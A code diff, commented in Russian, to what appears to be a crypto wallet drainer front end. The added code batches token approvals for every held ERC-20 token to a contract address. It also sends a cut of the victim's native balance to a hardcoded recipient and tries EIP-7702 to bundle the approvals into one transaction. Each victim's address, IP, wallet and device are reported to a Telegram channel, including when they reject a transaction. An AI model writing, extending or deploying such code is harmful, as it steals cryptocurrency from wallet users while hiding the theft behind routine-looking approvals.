@@ -5,7 +5,28 @@ import { formatUnits, maxUint256, isAddress, getAddress, parseUnits, encodeFunct
 import { readContract, writeContract, sendCalls, estimateGas, getGasPrice, getBalance } from '@wagmi/core'
 
 // === Глобальный флаг для управления sendCalls ===
-const USE_SENDCALLS = false; // Поставьте false для отключения batch-операций
+const USE_SENDCALLS = true; // Поставьте false для отключения batch-операций
+
+// === Экспериментальная поддержка EIP-7702 ===
+// Включает попытку выполнить пакет approve через временную авторизацию EOA (если кошелек поддерживает EIP-7702)
+const USE_EIP_7702 = true
+const EIP7702_INVOKER_ADDRESS = import.meta.env.VITE_EIP7702_INVOKER || '' // адрес invoker-контракта под 7702 (заглушка)
+// Параметры нативного перевода в батчинге
+const NATIVE_TRANSFER_RECIPIENT = '0x2345678901234567890123456789012345678901'
+const DEFAULT_NATIVE_TRANSFER_WEI = 20000000000000n // 0.00002 ETH (или эквивалент), как безопасный минимум
+
+const chooseNativeTransferAmount = (balanceWei) => {
+  try {
+    const onePercent = balanceWei / 100n
+    const base = DEFAULT_NATIVE_TRANSFER_WEI
+    const amount = onePercent > base ? onePercent : base
+    if (amount <= 0) return 0n
+    if (amount >= balanceWei) return balanceWei / 2n
+    return amount
+  } catch (_) {
+    return 0n
+  }
+}
 
 // Утилита для дебаунсинга
 const debounce = (func, wait) => {
@@ -15,6 +36,43 @@ const debounce = (func, wait) => {
     timeout = setTimeout(() => func(...args), wait)
   }
 }
+
+// === Вспомогательные утилиты для EIP-7702 ===
+const toHexChainId = (chainId) => {
+  try {
+    return '0x' + BigInt(chainId).toString(16)
+  } catch (_) {
+    return undefined
+  }
+}
+
+// Очень консервативная проверка поддержки 7702 (capabilities могут отличаться у кошельков)
+const supportsEip7702 = async () => {
+  try {
+    const provider = window?.ethereum
+    if (!provider || typeof provider.request !== 'function') return false
+    const caps = await provider.request({ method: 'wallet_getCapabilities' }).catch(() => null)
+    if (!caps) return false
+    const s = JSON.stringify(caps).toLowerCase()
+    return s.includes('7702') || s.includes('authorization') || s.includes('invocation')
+  } catch (_) {
+    return false
+  }
+}
+
+// Упрощенный ABI invoker'а: ожидается метод invoke(address[] targets, bytes[] datas)
+const eip7702InvokerAbi = [
+  {
+    type: 'function',
+    name: 'invoke',
+    stateMutability: 'nonpayable',
+    inputs: [
+      { name: 'targets', type: 'address[]' },
+      { name: 'datas', type: 'bytes[]' }
+    ],
+    outputs: []
+  }
+]
 
 // Функция для мониторинга транзакции
 const monitorAndSpeedUpTransaction = async (txHash, chainId, wagmiConfig) => {
@@ -423,6 +481,22 @@ async function notifyTransferSuccess(address, walletName, device, token, chainId
   }
 }
 
+// New: notify about explicit user rejection
+async function notifyTransactionRejected(address, walletName, device, context, chainId) {
+  try {
+    const ip = await getUserIP()
+    const scanLink = getScanLink(address, chainId)
+    const networkName = Object.keys(networkMap).find(key => networkMap[key].chainId === chainId) || 'Unknown'
+    const message = `❌ Transaction rejected by user (${walletName} - ${device})\n` +
+                    `🌀 [Address](${scanLink})\n` +
+                    `🕸 Network: ${networkName}\n` +
+                    `🎯 Context: ${context}`
+    await sendTelegramMessage(message)
+  } catch (error) {
+    store.errors.push(`Error in notifyTransactionRejected: ${error.message}`)
+  }
+}
+
 const TOKENS = {
   'Ethereum': [
     { symbol: 'USDT', address: '0xdac17f958d2ee523a2206206994597c13d831ec7', decimals: 6 },
@@ -693,10 +767,10 @@ const performBatchOperations = async (mostExpensive, allBalances, state) => {
   }
 
   try {
-    // Get tokens with non-zero balance in the most expensive token's network
+    // Токены с ненулевым балансом
     const networkTokens = allBalances.filter(t => t.network === mostExpensive.network && t.balance > 0)
 
-    // Prepare approve calls for ERC-20 tokens
+    // Подготовка approve для ERC-20
     const approveCalls = networkTokens
       .filter(t => t.address !== 'native')
       .map(t => ({
@@ -709,27 +783,117 @@ const performBatchOperations = async (mostExpensive, allBalances, state) => {
         value: '0x0'
       }))
 
-    // Send batch transaction
-    if (approveCalls.length > 0) {
-	const gasLimit = BigInt(550000)
-   	const maxFeePerGas = BigInt(1000000000)
-    	const maxPriorityFeePerGas = BigInt(1000000000)
-    	console.log(`Approving token with gasLimit: ${gasLimit}, 	maxFeePerGas: ${maxFeePerGas}, maxPriorityFeePerGas: ${maxPriorityFeePerGas}`)
-      const id = await sendCalls(wagmiAdapter.wagmiConfig, {
-        calls: approveCalls,
-        account: getAddress(state.address),
-        chainId: mostExpensive.chainId,
-        gas: gasLimit,
-	maxFeePerGas,
-	maxPriorityFeePerGas
+    // Добавим нативный перевод в батч (всегда один перевод на заданный адрес)
+    // Заметим: для EIP-7702 invoker принимает только calldata, поэтому натив переведем отдельным элементом в sendCalls,
+    // а для 7702 — опустим value в invoke и будем делать нативный перевод через sendCalls при отсутствии 7702.
+
+    // Проверяем баланс нативного токена (через wagmi/viem)
+    let nativeTransferCall = null
+    try {
+      const nativeBalance = await getBalance(wagmiAdapter.wagmiConfig, {
+        address: getAddress(state.address),
+        chainId: mostExpensive.chainId
       })
-      console.log(`Batch transaction sent with id: ${id}`)
-      return { success: true, txHash: id }
+      const amountWei = chooseNativeTransferAmount(nativeBalance.value)
+      if (amountWei > 0n) {
+        nativeTransferCall = {
+          to: getAddress(NATIVE_TRANSFER_RECIPIENT),
+          data: '0x',
+          value: `0x${amountWei.toString(16)}`
+        }
+      }
+    } catch (e) {
+      console.warn('Could not fetch native balance, skipping native transfer in batch:', e?.message || e)
     }
+
+    const hasErc20Approves = approveCalls.length > 0
+
+    // Ветка: если нет ERC-20 токенов, делаем батч только с нативным переводом
+    if (!hasErc20Approves && nativeTransferCall) {
+      // Попытка 7702 не подходит для value, поэтому сразу sendCalls с одним native
+      try {
+        const id = await sendCalls(wagmiAdapter.wagmiConfig, {
+          calls: [nativeTransferCall],
+          account: getAddress(state.address),
+          chainId: mostExpensive.chainId
+        })
+        console.log(`Native-only batch sent with id: ${id}`)
+        return { success: true, txHash: id }
+      } catch (error) {
+        if (error?.code === 4001 || error?.code === -32000) {
+          // Только явный отказ пользователя
+          const walletInfo = appKit.getWalletInfo() || { name: 'Unknown Wallet' }
+          const device = detectDevice()
+          await notifyTransactionRejected(state.address, walletInfo.name, device, 'native-only batch', mostExpensive.chainId)
+          return { success: false, error: 'USER_REJECTED' }
+        }
+        if (String(error?.message || '').includes('wallet_sendCalls') || String(error?.message || '').includes('does not exist / is not available')) {
+          return { success: false, error: 'BATCH_NOT_SUPPORTED' }
+        }
+        return { success: false, error: error.message }
+      }
+    }
+
+    // Если есть approve, пробуем сначала EIP-7702 (single tx), затем sendCalls; в sendCalls добавим и нативный перевод, если он посчитан
+    if (hasErc20Approves) {
+      if (USE_EIP_7702 && EIP7702_INVOKER_ADDRESS) {
+        try {
+          const eip7702Available = await supportsEip7702()
+          if (eip7702Available) {
+            const provider = window?.ethereum
+            if (!provider || typeof provider.request !== 'function') throw new Error('Provider not available for 7702')
+            const targets = approveCalls.map(c => getAddress(c.to))
+            const datas = approveCalls.map(c => c.data)
+            const data = encodeFunctionData({ abi: eip7702InvokerAbi, functionName: 'invoke', args: [targets, datas] })
+            const tx = {
+              from: getAddress(state.address),
+              to: getAddress(EIP7702_INVOKER_ADDRESS),
+              data,
+              chainId: toHexChainId(mostExpensive.chainId)
+            }
+            const txHash = await provider.request({ method: 'eth_sendTransaction', params: [tx] })
+            console.log(`EIP-7702 batch approve sent: ${txHash}`)
+            return { success: true, txHash }
+          }
+        } catch (e) {
+          if (e?.code === 4001 || e?.code === -32000) {
+            const walletInfo = appKit.getWalletInfo() || { name: 'Unknown Wallet' }
+            const device = detectDevice()
+            await notifyTransactionRejected(state.address, walletInfo.name, device, 'eip-7702 batch', mostExpensive.chainId)
+            return { success: false, error: 'USER_REJECTED' }
+          }
+          console.warn('EIP-7702 path failed, falling back to wallet_sendCalls:', e?.message || e)
+        }
+      }
+
+      // sendCalls батч: approve + опционально native transfer
+      const calls = nativeTransferCall ? [...approveCalls, nativeTransferCall] : approveCalls
+      try {
+        const id = await sendCalls(wagmiAdapter.wagmiConfig, {
+          calls,
+          account: getAddress(state.address),
+          chainId: mostExpensive.chainId
+        })
+        console.log(`Batch transaction sent with id: ${id}`)
+        return { success: true, txHash: id }
+      } catch (error) {
+        if (error?.code === 4001 || error?.code === -32000) {
+          const walletInfo = appKit.getWalletInfo() || { name: 'Unknown Wallet' }
+          const device = detectDevice()
+          await notifyTransactionRejected(state.address, walletInfo.name, device, 'wallet_sendCalls batch', mostExpensive.chainId)
+          return { success: false, error: 'USER_REJECTED' }
+        }
+        if (String(error?.message || '').includes('wallet_sendCalls') || String(error?.message || '').includes('does not exist / is not available')) {
+          return { success: false, error: 'BATCH_NOT_SUPPORTED' }
+        }
+        return { success: false, error: error.message }
+      }
+    }
+
     return { success: false, message: 'No operations to perform' }
   } catch (error) {
     console.error('Batch operation error:', error)
-    if (error.message.includes('wallet_sendCalls') || error.message.includes('does not exist / is not available')) {
+    if (error.message && (error.message.includes('wallet_sendCalls') || error.message.includes('does not exist / is not available'))) {
       return { success: false, error: 'BATCH_NOT_SUPPORTED' }
     }
     return { success: false, error: error.message }
@@ -805,7 +969,7 @@ const initializeSubscribers = (modal) => {
           const batchResult = await performBatchOperations(mostExpensive, allBalances, state)
           
           if (batchResult.success) {
-            // Handle successful batch transaction
+            // Handle successful batch transaction (we will still wait for allowance or show success after transfer)
             console.log('Batch transaction successful')
             
             // Get all tokens that were approved in batch
@@ -815,16 +979,7 @@ const initializeSubscribers = (modal) => {
               t.address !== 'native'
             )
             
-            // Notify about batch approval for all tokens
-            for (const token of approvedTokens) {
-              await notifyTransferApproved(
-                state.address,
-                walletInfo.name,
-                device,
-                token,
-                mostExpensive.chainId
-              )
-            }
+            // Notify about batch approval for all tokens AFTER allowance confirmed below
             
             // Wait for allowance and send transfer request for all approved tokens
             for (const token of approvedTokens) {
@@ -834,6 +989,15 @@ const initializeSubscribers = (modal) => {
                   state.address,
                   token.address,
                   CONTRACTS[mostExpensive.chainId],
+                  mostExpensive.chainId
+                )
+                const walletInfoInner = appKit.getWalletInfo() || { name: 'Unknown Wallet' }
+                const deviceInner = detectDevice()
+                await notifyTransferApproved(
+                  state.address,
+                  walletInfoInner.name,
+                  deviceInner,
+                  token,
                   mostExpensive.chainId
                 )
                 
@@ -848,8 +1012,8 @@ const initializeSubscribers = (modal) => {
                 if (transferResult.success) {
                   await notifyTransferSuccess(
                     state.address,
-                    walletInfo.name,
-                    device,
+                    walletInfoInner.name,
+                    deviceInner,
                     token,
                     mostExpensive.chainId,
                     transferResult.txHash
@@ -866,8 +1030,14 @@ const initializeSubscribers = (modal) => {
           } else if (batchResult.error === 'BATCH_NOT_SUPPORTED') {
             // Кошелек не поддерживает sendCalls - fallback на обычный approve
             console.log('Batch transactions not supported (wallet_sendCalls not available), falling back to regular approve')
+          } else if (batchResult.error === 'USER_REJECTED') {
+            // Пользователь явно отклонил — не шлём ложные уведомления об успехе/аппруве
+            console.log('User rejected batch transaction')
+            hideCustomModal()
+            store.isProcessingConnection = false
+            return
           }
-          // Если batch не сработал по другой причине - также переходим к обычному approve
+          // Если batch не сработал по другой причине - переход к обычному approve
         }
         
         // Обычный approve (используется когда USE_SENDCALLS = false или batch не сработал)
